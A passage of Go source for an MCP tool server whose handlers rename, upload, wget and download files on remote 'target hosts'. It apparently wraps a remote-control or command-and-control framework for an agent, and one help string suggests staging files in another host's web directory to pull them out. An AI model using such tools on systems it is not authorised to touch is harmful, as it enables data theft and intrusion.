		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	target := r.GetString("target", "")
	newName := r.GetString("new_name", "")
	if path == "" || target == "" || newName == "" {
		return mcp.NewToolResultError("缺少 path/target/new_name 参数"), nil
	}
	if err := s.vs.RenameFile(ctx, id, path, target, newName); err != nil {
		return mcp.NewToolResultError("重命名失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "target": target, "new_name": newName, "renamed": true})
}

func (s *Server) handlerWgetFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	urlStr := r.GetString("url", "")
	if path == "" || urlStr == "" {
		return mcp.NewToolResultError("缺少 path 或 url 参数"), nil
	}
	if err := s.vs.WgetFile(ctx, id, path, urlStr); err != nil {
		return mcp.NewToolResultError("wget 失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "url": urlStr, "started": true})
}

func (s *Server) handlerUploadFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	local := r.GetString("local_path", "")
	if path == "" || local == "" {
		return mcp.NewToolResultError("缺少 path 或 local_path 参数"), nil
	}
	remoteName := r.GetString("remote_name", "")
	remote, err := s.vs.UploadFile(ctx, id, path, local, remoteName)
	if err != nil {
		return mcp.NewToolResultError("上传失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "local_path": local, "remote": remote, "uploaded": true})
}

func (s *Server) handlerDownloadFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	filename := r.GetString("filename", "")
	local := r.GetString("local_path", "")
	if path == "" || filename == "" {
		return mcp.NewToolResultError("缺少 path 或 filename 参数"), nil
	}
	wait := time.Duration(r.GetFloat("stage_wait_seconds", 120)) * time.Second
	if wait <= 0 {
		wait = 120 * time.Second
	}
	if wait > time.Hour {
		wait = time.Hour
	}

	// Two hops: the server pulls the file off the host first (this is the slow
	// part), then we fetch it. Reporting the staging state instead of blocking
	// for an unbounded time is what makes a big file survive an MCP client that
	// times the tool call out: the retry is cheap because the staged copy stays.
	stage, err := s.vs.StageFile(ctx, id, path, filename, wait)
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf(
			"暂存请求失败(host_id=%d, %s\\%s): %v\n"+
				"提示:暂存是「目标主机 → 服务端」这一跳,失败通常是目标离线(IsConnect=false)或文件不可读;"+
				"先用 list_hosts 确认主机在线、用 list_directory 确认路径存在。",
			id, path, filename, err)), nil
	}
	if !stage.Complete {
		return resultJSON(map[string]any{
			"host_id": id, "path": path, "filename": filename,
			"staged": false, "staging_percent": stage.Percent,
			"size_bytes":     stage.SizeBytes,
			"waited_seconds": int(stage.Waited.Seconds()),
			"note": fmt.Sprintf(
				"服务端仍在把文件从目标主机拉到自己的暂存目录(已等待 %d 秒,进度 %d%%),本次**没有**取回文件(不会返回半个文件)。"+
					"直接重试 download_file 即可:已暂存的内容会被复用,暂存完成时重试通常秒回。"+
					"大文件可以把 stage_wait_seconds 调大(上限 3600)一次等到位;若目标链路慢,可改用更快的中转:"+
					"在目标侧把文件复制到一台可 HTTP 访问的主机(如 web1 的网站目录),再用 wget_file 或直接 HTTP 拉取。",
				int(stage.Waited.Seconds()), stage.Percent),
		})
	}
	n, err := s.vs.FetchStaged(ctx, id, filename, local)
	if err != nil {
		return mcp.NewToolResultError("下载失败(文件已在服务端暂存,重试不会重复拉取): " + err.Error()), nil
	}
	out := map[string]any{
		"host_id": id, "path": path, "filename": filename,
		"local_path": local, "bytes": n, "downloaded": true,
		"staged": true, "staging_percent": 100,
		"size_bytes": stage.SizeBytes,
	}
	if stage.Reused {
		out["staged_reused"] = true // 命中服务端已暂存的副本,本次没有重新拉取
	}
	if n == 0 {
		out["warning"] = "服务端暂存目录里的副本是 0 字节:目标上的文件可能是空的,或上一次失败的暂存把它清空了。" +
			"请用 list_directory 确认目标上文件的真实大小;必要时先把目标上的文件重新生成/替换,再下载。"
	}
	return resultJSON(out)
}
